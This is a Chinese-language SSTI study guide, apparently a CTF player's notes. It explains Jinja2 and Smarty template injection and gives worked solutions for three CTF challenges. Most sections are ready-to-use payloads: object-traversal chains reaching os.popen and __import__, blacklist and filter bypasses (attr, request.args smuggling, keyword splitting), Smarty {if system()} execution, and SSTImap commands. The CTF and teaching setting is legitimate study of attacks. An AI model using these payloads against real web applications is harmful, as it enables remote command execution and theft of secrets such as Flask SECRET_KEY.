# SSTI 模板注入专题

> **数据越界变成了代码。**SQL 里是逃出引号，模板里是逃出 `{{ }}`。

---

## 一、SSTI 是什么

**正常的模板渲染：**

```python
render_template_string("hello {{ name }}", name="guest")
```

**`{{ name }}` 是占位符，被替换成 `guest`。**

**出问题的是这一种：**

```python
render_template_string("hello " + name)      # name 来自用户
```

**用户传 `{{7*7}}`，模板就变成 `hello {{7*7}}`，然后 Jinja2 把它当表达式算成 `hello 49`。**

**关键在于：`{{ }}` 里的东西不是"文字"，是"代码"。**

**危害有三个层次：**

```text
读信息:  {{config}}            配置、密钥
读文件:  {{...popen('cat /flag').read()}}
执行命令: 同上，拿到 shell
```

---

## 二、识别：三个探针

### 探针一：模板被执行了吗

```jinja
{{7*7}}
```

| 回显 | 含义 |
|---|---|
| `49` | **模板被求值了** ✓ |
| `{{7*7}}` | 只是字符串拼接 ✗ |

### 探针二：是什么引擎

```jinja
{{7*'7'}}
```

| 回显 | 引擎 |
|---|---|
| `7777777` | **Jinja2**（Python，`'7'` 是字符串） |
| `49` | Twig（PHP，把 `'7'` 转成数字） |

**不同引擎的语法前缀不同：**

```text
{{ }}         Jinja2 / Twig / Nunjucks
${ }          Freemarker / JSP EL
#{ }          Ruby ERB 的一种
<%= %>        ERB / ASP
@{ }          Thymeleaf
```

### 探针三：是什么框架

```jinja
{{config}}      →  Flask 的配置对象
{{url_for}}     →  <function url_for at 0x...>
{{self}}        →  模板自身对象
```

**`config` 出现基本就锁定 Flask。它里面还可能有 `SECRET_KEY`、数据库连接串——顺手就能捡到东西。**

---

## 三、关键认知：模板的名字空间 ≠ Python 的名字空间

**这是最容易卡住人的一点。**

```jinja
{{ ''.__class__ }}     →  <class 'str'>     ✓ 字面量不查名字空间
{{ str }}              →  空                ✗ 模板里没有 str 这个名字
{{ str.__mro__ }}      →  UndefinedError    ✗
```

**模板拿到的是很窄的一份名字表：**

| 有 | 没有 |
|---|---|
| `config`、`request`、`session` | `str`、`int`、`object` |
| `url_for`、`get_flashed_messages` | `os`、`sys`、`subprocess` |
| `lipsum`、`cycler`、`namespace` | `eval`、`exec`、`import` |
| `dict`、`range`（Jinja 自带工具） | |

**所以 SSTI 的起点只有两类：**

```text
① 字面量：''  ""  0  1          ← 不查名字空间
② 框架注入的全局：config / url_for / lipsum / request
```

### 三种反馈要分清

| 现象 | 含义 |
|---|---|
| **空白** | 取不到（名字不存在、下标越界、值是 None） |
| **500** | 取到了，但对它做了非法操作（调用 undefined、除零、类型错） |
| **有内容** | 成功 |

**为什么"取不存在的属性"不报错？**因为 Jinja 默认的 Undefined 是静默的——渲染成空字符串。只有你**对它再动手**（调用、运算）才会炸。

---

## 四、两条链

**目标都是拿到 `os` 模块，或者拿到 `__import__`。区别只是从哪儿出发。**

### 短链：从框架的钩子出发

```jinja
{{url_for}}                    →  <function url_for at 0x...>
{{url_for.__globals__}}        →  一大坨 dict
{{(url_for.__globals__)['os']}} →  <module 'os' ...>
{{(url_for.__globals__)['os'].popen('cat /flag').read()}}
```

**为什么能走通：`url_for` 是 Python 函数，函数身上挂着 `__globals__`（它定义时的模块全局空间），而那个空间里有 `os`。**

**同类入口：`lipsum`、`get_flashed_messages`、`cycler`（类不行，要它的方法）。**

### 长链：从字面量出发

```jinja
{{''.__class__}}                                →  <class 'str'>
{{''.__class__.__bases__[0]}}                   →  <class 'object'>
{{''.__class__.__bases__[0].__subclasses__()}}  →  几百个类
...挑一个 → .__init__.__globals__ → __builtins__ → __import__ → os
```

### 对比

| | 短链 | 长链 |
|---|---|---|
| 步数 | 3 步 | 8 步 |
| 依赖 | Flask 注入了 `url_for` | 只要是 Python |
| 稳定性 | 名字被删就断 | 版本变了下标就变 |
| 何时用 | **先试这个** | 短链不通再走 |

**实战顺序：先看模板里有什么名字，有钩子走短链，没有走长链。**

---

## 五、逐环解剖

### 5.1 `__class__`：任何对象都知道自己是什么类

```jinja
''.__class__   →  <class 'str'>
0.__class__    →  <class 'int'>
```

### 5.2 `__base__` / `__bases__` / `__mro__`：往上爬

| 写法 | 返回 | 能下标吗 |
|---|---|---|
| `__base__` | **一个类**（第一个父类） | ❌ 不能 |
| `__bases__` | **元组**（所有直接父类） | ✓ 能 `[0]` |
| `__mro__` | **元组**（完整继承链，含自己） | ✓ |

```jinja
{{''.__class__.__base__}}      →  <class 'object'>    ✓
{{''.__class__.__bases__[0]}}  →  <class 'object'>    ✓
{{''.__class__.__mro__}}       →  (<class 'str'>, <class 'object'>)
```

**⚠️ `__base__[0]` 是错的**，它已经是一个类，不能再下标，结果是空。

### 5.3 `__subclasses__()`：整个类宇宙

```jinja
{{''.__class__.__bases__[0].__subclasses__()|length}}   →  587（因环境而异）
```

**它是 `object` 的子类列表——内存里所有已加载的类。**

**为什么这一步厉害：从这里开始，你不再受"手上这个对象"的限制。**

**⚠️ 下标高度不稳定**：Python 版本、import 顺序、装了什么库都会变。**别人 WP 里的 `[169]` 抄过来多半是空的。**

### 5.4 `__init__.__globals__`：函数定义时所在的模块空间

```jinja
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__}}
```

**它是"这个函数的代码当初写在哪、那个文件里还有什么"——所以里面常有 `os`、`sys`、`subprocess`。**

**⚠️ 不是每个类都有：**

| 情况 | `__globals__` |
|---|---|
| Python 里 `def` 出来的函数 | ✓ 有 |
| C 层实现的（`wrapper_descriptor`） | ❌ 没有 |

**这就是为什么 `__subclasses__()[0]`（`type`）会失败——它的 `__init__` 是 C 写的。**

### 5.5 `__builtins__` → `__import__`：通用出口

```jinja
{{...__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

**`__builtins__` 里有 `__import__`，能 import 就能拿任何模块。**

**⚠️ 取法有两种，看它是 dict 还是模块：**

```text
['__builtins__']     取键（dict）
.builtins__          取属性（模块）——  注意这里要写全 __builtins__
```

### 5.6 点号 vs 方括号

```text
.x       取属性
['x']    取键
.['x']   ❌ 语法错误（点后面必须跟名字）
```

**dict 的键不能用点号取：`d.builtins` 不行，`d['builtins']` 才行。**

---

## 六、Jinja2 语法必备

### 6.1 两种括号

```jinja
{{ 表达式 }}        输出值
{% 语句 %}          控制结构（for / if / set）
{# 注释 #}
```

### 6.2 管道 `|`

**`|` 不是位或，是"把左边交给右边处理"。**

```jinja
a|f        ≈  f(a)
a|f|g      ≈  g(f(a))
a|f(x)     ≈  f(a, x)
```

### 6.3 必会的过滤器

| 过滤器 | 作用 | 例子 |
|---|---|---|
| `attr` | 按名字取属性（**绕过滤用**） | `x\|attr('__globals__')` |
| `selectattr` | 按属性筛列表 | `l\|selectattr('__name__','equalto','catch_warnings')` |
| `map` | 对每个元素取属性 | `l\|map(attribute='__name__')` |
| `list` | 把生成器变成列表 | `...\|list` |
| `first` / `last` | 取第一个 / 最后一个 | `...\|first` |
| `length` | 长度（**不能直接接生成器**） | `l\|list\|length` |
| `join` | 拼成字符串 | `l\|join(',')` |
| `string` | 转成字符串 | `x\|string` |
| `default` | 取不到时给默认值 | `x\|default('none')` |

### 6.4 生成器是惰性的

```jinja
...|map(attribute='__name__')        →  <generator object ...>
...|map(attribute='__name__')|list   →  ['type', 'async_generator', ...]
```

**`map` / `select` / `selectattr` 返回的都是生成器，不 `|list` 或 `|first` 就只打印一个对象地址。**

**而且生成器只能走一次**——同一个表达式里消费两遍，第二次是空的。

### 6.5 跨环境稳的写法：按名字找，不记下标

```jinja
{{''.__class__.__bases__[0].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
```

**`selectattr` 按属性名筛，`first` 取第一个。位置变了也无所谓。**

---

## 七、过滤与绕过

### 7.1 先分清拦的是什么

```text
拦"形状"：匹配 .__globals__ 这种写法  →  换形状就能过
拦"词"  ：匹配 __globals__ 这个词     →  得让这个词不以明文出现
拦"字符"：下划线 / 点 / 方括号 / 引号 →  换语法
```

### 7.2 换形状（最常见的绕过）

```jinja
{{url_for.__globals__}}          →  被拦，空
{{url_for|attr('__globals__')}}  →  过了
```

**`attr` 把属性名放进了字符串参数里，绕开了"点+属性名"这种形状的匹配。**

### 7.3 其他思路

| 被拦 | 绕过思路 |
|---|---|
| 下划线 `_` | 用 `request.args` 传参数值；或用 `\|attr` + 字符串拼接 |
| 引号 | 从 `request.args.x` 取，不在模板里写字面量 |
| 方括号 | `.__getitem__(0)` 或 `\|attr` |
| `{{ }}` | `{% print(...) %}` |
| 点号 | `\|attr` 全替换 |

### 7.4 沙箱

**Jinja2 有 `SandboxedEnvironment`，会限制 `__` 开头的属性访问。默认的 Flask 渲染环境**不是**沙箱——这是为什么默认就能打。**

**遇到"沙箱"报错时，先确认它到底是真沙箱，还是应用层做了关键词替换。**两者绕法完全不同。

### 7.5 实战：五种过滤，五种换法

**下面每一条都是真打过的，不是设想。**

#### ① 拦下划线 `_`

**`__class__`、`__globals__` 全都带下划线，一个都写不出来。**

**换法：名字不从模板里写，从**另一个参数**偷运过来。**

```text
?name={{''|attr(request.args.a)|attr(request.args.b)|first}}&a=__class__&b=__bases__
```

**过滤器只检查 `name`，`a`、`b` 是通道。**`name` 里一个下划线都没有。

#### ② 拦 `{{ }}`

**连输出括号都不给了。**

**换法：Jinja 还有 `{% %}` 语句，其中 `print` 就是用来输出的（Jinja 3 才有）。**

```jinja
{% print(''|attr(...)) %}
```

**备选：`{% filter %}` 能处理包在里面的字面量。**

#### ③ 拦关键词（`class` / `globals` / `attr` / `os`）

**换法：把词拆开，让原文里不出现完整的那串字母。**

```jinja
{{''['__cla'+'ss__']}}          →  <class 'str'>
```

**为什么必须用方括号：点号后面只能跟**字面名字**，没法拼接；`attr` 又可能一起被拦。**

#### ④ 子串匹配的坑：拆词时每一段都要检查

**拦截是**子串**匹配。所以：**

```text
{{'host'}}   →  no no no      ← host 里含 os
{{'pas'}}    →  pas           ← 干净
```

**拆词不能只看"整体不出现"，要看**每一段**。**`'this_is_the_fl'+'ag.txt'` 两段都干净；`'cat /etc/host'+'name'` 第一段就中招了。**

#### ⑤ 根本不是 Jinja

**`{{7*7}}` 回 49 就往下走，会走错路——**Smarty 也回 49**。**

**换法：先换引擎，再换语法。**

```text
{{7*'7'}}     →  7777777 = Jinja2     49 = PHP 系（Smarty/Twig）
{$smarty.version}  →  3.1.34          Smarty 的内置变量
```

**Smarty 3 没有 `{php}` 标签了，但有 `{if}`：**

```text
{if phpinfo()}{/if}     ← Smarty 把 {if 表达式} 编译成 PHP 的 if (...)
{if system('ls /')}{/if}
```

**注意 `{if}` 只判真假不输出，所以要挑**自己会 echo** 的函数（`phpinfo`、`system`、`readfile`）。**

### 7.6 判断顺序（卡住时按这个走）

```text
① 三种反馈：空白 / 500 / 有内容        →  先定性质
② {{7*'7'}}                            →  先定引擎
③ 单独包一个词去测：{{'xxx'}}           →  定黑名单粒度
④ 换形状 or 换引擎 or 拼接             →  按上面的表选一个
```

**第③步最有用：把可疑的词一个一个包成 `{{'词'}}` 发过去，哪个回 `no no honey`/`no hack` 就是哪个。**比整条 payload 试错快十倍。


---

## 八、工具

### SSTImap（首选）

```powershell
$SM = 'E:\dsh\tools\SSTImap\sstimap.py'
python $SM -u "http://target/?name=*" -e jinja2            # 探测
python $SM -u "http://target/?name=*" -e jinja2 -S "id"    # 执行
```

**`*` 是注入点标记。它擅长：确认注入、认引擎、跑最普通那条链。**

### Fenjing（国内常用，带 WAF 绕过）

```powershell
pip install fenjing
fenjing webui         # 图形界面
```

### tplmap（历史）

**Python 2 的，已归档。**`E:\dsh\tools\tplmap` 留着看代码和它的 Burp 插件。

### 工具的边界

**它解决"有没有 SSTI"和"最简单的那条链"。**过滤、下标、语法细节，全得手动。

---

## 九、实战记录

### [BJDCTF 2nd] fake google

**一个输入框 → 试 SQL 注入，内容被原样打印 → 看源码发现 `sssssti` 提示 → `{{7*7}}` 得 49 → `{{7*'7'}}` 得 7777777 → `{{config}}` 确认 Flask。**

**然后两条路都打通了：**

```jinja
# 长链：_wrap_close 的 globals 里直接有 popen
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}

# 长链：catch_warnings 走 __builtins__
{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}

# 短链
{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
```

**完整过程见 [WP](/blog/bjdctf2-fake-google-ssti/)。**

### [GYCTF2020] FlaskApp

**解密功能把结果当模板渲染；有黑名单，但 `+` 没被拦。**

```text
被拦：*  eval  os  popen  system  import  request  subprocess  flag
```

**两条路都要先 `ls /` 找文件名，再 `cat`：**

```jinja
# 短路
{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}

# 长链（eval 版，双层拆分：Jinja 一层 + Python 一层）
{{(...['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
```

**这题还教了一件事：POST 之后 302 重定向，结果存在 session 里——"没回显"其实是 JSON 在下一页。**

**完整过程见 [WP](/blog/gyctf2020-flaskapp-ssti/)。**

### [BJDCTF2020] The mystery of ip

**不是 Jinja，是 Smarty（PHP）。**

```text
注入点在 X-Forwarded-For（不在参数里）
{{7*'7'}} → 49          确认是 PHP 系
{$smarty.version} → 3.1.34
{if phpinfo()}{/if}      Smarty 3 的函数调用入口
{if system('cat /flag')}{/if}
```

**完整过程见 [WP](/blog/bjdctf2020-mystery-of-ip-smarty/)。**


---

## 十、十个坑

**全是今天真踩过的，不是抄来的。**

| # | 坑 | 现象 | 正解 |
|---|---|---|---|
| 1 | `__base__[0]` | 空 | `__base__` 是类不能下标，用 `__bases__[0]` |
| 2 | `.__globals__.['x']` | `TemplateSyntaxError: expected name or number` | 点后面必须跟名字，去掉那个点 |
| 3 | `d.builtins__` | 空 | dict 的键要用 `['__builtins__']`，且四个下划线 |
| 4 | `poen(...)` 拼错 | 500 | 拼写错 → 调用 undefined → 异常 |
| 5 | 生成器直接渲染 | `<generator object ...>` | 加 `\|list` 或 `\|first` |
| 6 | 抄别人的 `[169]` | 空 | 下标随环境变，用 `selectattr` 按名字找 |
| 7 | `{{str.__mro__}}` | `UndefinedError` | `str` 不在模板名字空间，从 `''` 或 `url_for` 出发 |
| 8 | `__init__.globals__` | 空 | 少两个下划线，写全 `__globals__` |
| 9 | 把空白当成"没执行" | 判断错方向 | 空白 = 取不到；500 = 取到了但操作非法 |
| 10 | 在字符串里少写下划线 | `NameError`（被 eval 时） | `"import__('os')"` 里也要写全 `__import__` |

---

## 十一、一句话总结

> **SSTI 的本质是：`{{ }}` 里的东西是代码，不是文字。**
>
> **入门只看一件事：能不能从"我手上的对象"走到"模块全局空间"。**
>
> **`__globals__` 是那道门，`__builtins__` 是备用钥匙，`|attr` 是换门牌号的工具。**
>
> **判断永远比 payload 重要：空白还是 500？名字在不在？拦的是形状还是词？**
